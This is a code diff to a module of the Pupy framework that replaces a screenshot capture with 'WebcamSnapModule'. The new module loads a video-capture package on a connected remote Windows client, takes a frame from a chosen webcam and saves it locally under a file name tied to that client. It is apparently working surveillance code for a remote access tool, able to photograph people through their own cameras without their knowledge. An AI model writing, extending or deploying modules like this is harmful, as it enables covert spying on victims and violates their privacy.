@@ -25,7 +25,7 @@ from zlib import compress, crc32
 import struct
 import subprocess
 
-__class_name__="Screenshoter"
+__class_name__="WebcamSnapModule"
 
 def pil_save(filename, pixels, width, height):
 	from PIL import Image, ImageFile
@@ -34,45 +34,33 @@ def pil_save(filename, pixels, width, height):
 	ImageFile.MAXBLOCK = width * height
 	img=img.transpose(Image.FLIP_TOP_BOTTOM)
 	img.save(filename, quality=95, optimize=True, progressive=True)
-	logging.info('Screenshot saved to %s'%filename)
+	logging.info('webcam snap saved to %s'%filename)
 
 
-class Screenshoter(PupyModule):
-	""" take a screenshot :) """
+class WebcamSnapModule(PupyModule):
+	""" take a webcam snap :) """
 	@windows_only
 	def is_compatible(self):
 		pass
 
 	def init_argparse(self):
-		self.arg_parser = PupyArgumentParser(prog='screenshot', description=self.__doc__)
-		self.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
-		self.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
-		self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open eog on the screenshot for preview')
+		self.arg_parser = PupyArgumentParser(prog='webcam_snap', description=self.__doc__)
+		self.arg_parser.add_argument('-d', '--device', type=int, default=0, help='take a webcam snap on a specific device (default : 0)')
+		self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open eog on the snap for preview')
 
 	def run(self, args):
 		try:
-			os.makedirs(os.path.join("data","screenshots"))
+			os.makedirs(os.path.join("data","webcam_snaps"))
 		except Exception:
 			pass
-		self.client.load_package("pupwinutils.screenshot")
-		screens=None
-		if args.screen is None:
-			screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors(oneshot=True)
-		else:
-			screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors()
-		if args.enum:
-			res=""
-			for i, screen in enumerate(screens):
-				res+="{:<3}: {}\n".format(i,screen)
-			return res
-		if args.screen is None:
-			args.screen=0
-		selected_screen=screens[args.screen]
-		screenshot_pixels=self.client.conn.modules["pupwinutils.screenshot"].get_pixels(selected_screen)
-		filepath=os.path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
-		pil_save(filepath, screenshot_pixels, selected_screen["width"], selected_screen["height"])
+		self.client.load_package("vidcap")
+		filepath=os.path.join("data","webcam_snaps","snap_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
+		dev=self.client.conn.modules['vidcap'].new_Dev(args.device,0)
+		self.info("device %s exists, taking a snap ..."%args.device)
+		buff, width, height = dev.getbuffer()
+		pil_save(filepath, buff, width, height)
 		if args.view:
 			subprocess.Popen(["eog",filepath])
-		self.success("screenshot saved to %s"%filepath)
+		self.success("webcam snap saved to %s"%filepath)
 
 
